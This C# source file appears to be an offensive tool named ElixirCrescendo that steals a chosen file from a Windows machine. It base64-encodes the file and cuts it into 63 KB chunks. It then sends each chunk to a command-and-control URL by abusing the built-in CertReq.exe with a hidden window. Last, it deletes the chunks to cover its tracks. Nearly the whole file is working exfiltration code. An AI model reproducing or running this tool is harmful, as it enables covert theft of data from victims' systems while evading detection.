using System;
using System.Diagnostics;
using System.IO;
using System.Linq;

namespace elixircrescendo
{
    class Program
    {
        public static void ECheader()
        {

            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.WriteLine("  *  *  * ElixirCrescendo *  *  *");
            Console.WriteLine(@"             O*  .");
            Console.WriteLine(@"               0   *  ");
            Console.WriteLine(@"              .   o");
            Console.WriteLine(@"             o   .");
            Console.WriteLine(@"           _________");
            Console.WriteLine(@"         c(`       ')o");
            Console.WriteLine(@"           \.     ,/     ");
            Console.WriteLine(@"          _//^---^\\_  ");
            Console.WriteLine("  --CertReq.exe Exfil Wrapper--");
            Console.WriteLine(" ");
            Console.ResetColor();
        }

        public static void Help()
        {
            ECheader();

            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("Example: ");
            Console.ForegroundColor = ConsoleColor.DarkMagenta;
            Console.WriteLine("    C:\\>ElixirCrescendo.exe \"C:\\CoolFolder\\juicy_file.zip\"");
            Console.ResetColor();
            System.Environment.Exit(1);
        }

        private static void SplitFile(string inputFile, int chunkSize, string path, string Xc2)
        {
            // source for this most of this function
            // stackoverflow.com/a/16901426/13535588
            byte[] buffer = new byte[chunkSize];

            using (Stream input = File.OpenRead(inputFile))
            {
                int index = 0;
                Console.WriteLine("[+] Chunking up payload and sending with CertReq!");
                while (input.Position < input.Length)
                {

                    string cind = path + "\\" + index;
                    using (Stream output = File.Create(cind))
                    {
                        int chunkBytesRead = 0;
                        while (chunkBytesRead < chunkSize)
                        {
                            int bytesRead = input.Read(buffer,
                                                       chunkBytesRead,
                                                       chunkSize - chunkBytesRead);

                            if (bytesRead == 0)
                            {
                                break;
                            }
                            chunkBytesRead += bytesRead;
                        }
                        output.Write(buffer, 0, chunkBytesRead);

                        System.Threading.Thread.Sleep(800);

                        Process process = new Process
                        {
                            StartInfo =
                            {
                                UseShellExecute = false,
                                RedirectStandardOutput = true,
                                RedirectStandardError = true,
                                CreateNoWindow = true,
                                FileName = "CertReq.exe",
                                Arguments = "-Post -config " + Xc2 + " " + cind
                            }
                        };
                        process.Start();
                        //process.WaitForExit();
                    }

                    index++;
                    System.Threading.Thread.Sleep(200);

                }
                Console.WriteLine("[+] Payload has been exfil'ed!..cleaning up..");
                Clean(index, path);
            }
        }

        private static void Clean(int index, string path)
        {
            foreach (int i in Enumerable.Range(0, index))
            {
                File.Delete(path + i);
                System.Threading.Thread.Sleep(100);
            }
            Console.WriteLine("[+] Deleting 63kb chunks and serialized payload...");
            System.Threading.Thread.Sleep(2000);
        }

        static void Main(string[] args)
        {
            if (args.Length != 1) { Help(); };
            ECheader();
            foreach (string arg in args)
            {
                String Xfile = arg.Substring(0);
                int chunkSize = 63000;

                /////////////////////////////////////////////////
                // Set your c2 uri that accepts POST requests //
                ////////////////////////////////////////////////
                string Xc2 = "http://xxxxxxx/xx.x";

                Console.WriteLine("[+] Serializing your ingredient into an Elixir!");
                System.Threading.Thread.Sleep(500);
                Byte[] bytes = File.ReadAllBytes(Xfile);
                string bcon = Convert.ToBase64String(bytes);


                string inputFile = @"C:\ProgramData\b64.txt";
                File.WriteAllText(inputFile, bcon);

                string path = @"C:\ProgramData\";

                SplitFile(inputFile, chunkSize, path, Xc2);
                File.Delete(@"C:\ProgramData\b64.txt");
                Console.WriteLine("[+] Done!");
                Console.WriteLine("[!] Now just base64 decode your exfil'ed juice to its original form");
                Console.ResetColor();
            }
        }
    }
}
